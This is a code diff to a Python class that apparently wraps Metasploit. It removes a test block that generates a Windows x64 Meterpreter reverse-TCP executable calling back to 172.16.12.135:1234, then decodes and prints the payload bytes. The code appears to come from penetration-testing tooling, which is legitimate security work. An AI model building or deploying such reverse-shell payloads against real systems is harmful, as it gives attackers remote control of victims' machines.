@@ -187,13 +187,3 @@ class MSFModule(object):
         except Exception as E:
             logger.error(E)
             return False
-
-
-if __name__ == '__main__':
-    import base64
-    opts = {'PAYLOAD': 'windows/x64/meterpreter/reverse_tcp', 'WORKSPACE': None, 'VERBOSE': False, 'WfsDelay': 2, 'EnableContextEncoding': False, 'ContextInformationFile': None, 'DisablePayloadHandler': False, 'ExitOnSession': False, 'ListenerTimeout': 0, 'LHOST': '172.16.12.135', 'LPORT': 1234, 'ReverseListenerBindAddress': '0.0.0.0', 'PayloadUUIDSeed': '118cb5a5-ae7b-11ec-86c4-000c29c3ea5e', 'ReverseListenerBindPort': None, 'ReverseAllowProxy': False, 'ReverseListenerComm': None, 'ReverseListenerThreaded': False, 'StagerRetryCount': 10, 'StagerRetryWait': 5, 'PingbackRetries': 0, 'PingbackSleep': 30, 'PayloadUUIDRaw': None, 'PayloadUUIDName': None, 'PayloadUUIDTracking': False, 'EnableStageEncoding': False, 'StageEncoder': None, 'StageEncoderSaveRegisters': '', 'StageEncodingFallback': True, 'PrependMigrate': False, 'PrependMigrateProc': None, 'EXITFUNC': 'process', 'AutoLoadStdapi': True, 'AutoVerifySessionTimeout': 30, 'InitialAutoRunScript': '', 'AutoRunScript': '', 'AutoSystemInfo': True, 'EnableUnicodeEncoding': False, 'HandlerSSLCert': None, 'SessionRetryTotal': 31536000, 'SessionRetryWait': 10, 'SessionExpirationTimeout': 94608000, 'SessionCommunicationTimeout': 31536000, 'PayloadProcessCommandLine': '', 'AutoUnhookProcess': False, 'TARGET': 0, 'ID': 4, 'Format': 'exe'}
-    mname = "windows/x64/meterpreter/reverse_tcp"
-    result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
-                                               timeout=15)
-    byteresult = base64.b64decode(result.get('payload'))
-    print(byteresult)
